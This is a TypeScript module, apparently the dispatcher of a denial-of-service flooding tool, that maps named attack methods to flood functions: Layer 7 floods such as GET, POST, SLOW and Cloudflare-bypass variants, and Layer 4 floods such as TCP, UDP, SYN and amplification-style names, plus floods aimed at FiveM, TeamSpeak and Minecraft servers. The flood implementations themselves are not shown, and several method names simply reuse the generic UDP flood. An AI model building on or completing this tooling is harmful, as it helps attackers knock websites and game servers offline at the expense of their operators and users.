import * as get from "./get"
import * as post from "./post"
import * as stress from "./stress"
import * as pps from "./pps"
import * as slow from "./slow"
import * as bypass from "./bypass"
import * as dyn from "./dyn"
import * as head from "./head"
import * as cookie from "./cookie"
import * as ovh from "./ovh"
import * as tcp from "./tcp"
import * as udp from "./udp"
import * as cps from "./cps"
import * as connection from "./connection"
import * as rhex from "./rhex"
import * as stomp from "./stomp"
import * as nullM from "./null"
import * as even from "./even"
import * as gsb from "./gsb"
import * as dgb from "./bypass"
import * as avb from "./avb"
import * as apache from "./apache"
import * as xmlrpc from "./xmlrpc"
import * as bot from "./bot"
import * as downloader from "./downloader"
import * as killer from "./killer"
import * as tor from "./tor"
import * as cfbuam from "./cfbuam"
import * as vse from "./vse"
import * as ts3 from "./ts3"
import * as fivem from "./fivem"
import * as fivemToken from "./fivem-token"
import * as mcpe from "./mcpe"
import * as minecraft from "./minecraft"
import * as mcbot from "./mcbot"

type FloodFn = (url: string, rpc: number, onStats: (r: number, b: number) => void) => Promise<void>

const L7: Record<string, FloodFn> = {
  GET: get.flood,
  POST: post.flood,
  STRESS: stress.flood,
  PPS: pps.flood,
  SLOW: slow.flood,
  BYPASS: bypass.flood,
  CFB: bypass.flood,
  CFBUAM: cfbuam.flood,
  DYN: dyn.flood,
  HEAD: head.flood,
  COOKIE: cookie.flood,
  OVH: ovh.flood,
  NULL: nullM.flood,
  RHEX: rhex.flood,
  STOMP: stomp.flood,
  EVEN: even.flood,
  GSB: gsb.flood,
  DGB: dgb.flood,
  AVB: avb.flood,
  APACHE: apache.flood,
  XMLRPC: xmlrpc.flood,
  BOT: bot.flood,
  DOWNLOADER: downloader.flood,
  KILLER: killer.flood,
  TOR: tor.flood,
  BOMB: bypass.flood,
}

const L4: Record<string, FloodFn> = {
  TCP: tcp.flood,
  UDP: udp.flood,
  CPS: cps.flood,
  CONNECTION: connection.flood,
  VSE: vse.flood,
  TS3: ts3.flood,
  FIVEM: fivem.flood,
  "FIVEM-TOKEN": fivemToken.flood,
  MCPE: mcpe.flood,
  MINECRAFT: minecraft.flood,
  MCBOT: mcbot.flood,
  SYN: tcp.flood,
  "OVH-UDP": udp.flood,
  ICMP: udp.flood,
  MEM: udp.flood,
  NTP: udp.flood,
  DNS: udp.flood,
  CHAR: udp.flood,
  CLDAP: udp.flood,
  ARD: udp.flood,
  RDP: udp.flood,
}

export function getLayer7Method(name: string): FloodFn {
  return L7[name] ?? L7.GET
}

export function getLayer4Method(name: string): FloodFn | null {
  return L4[name] ?? null
}
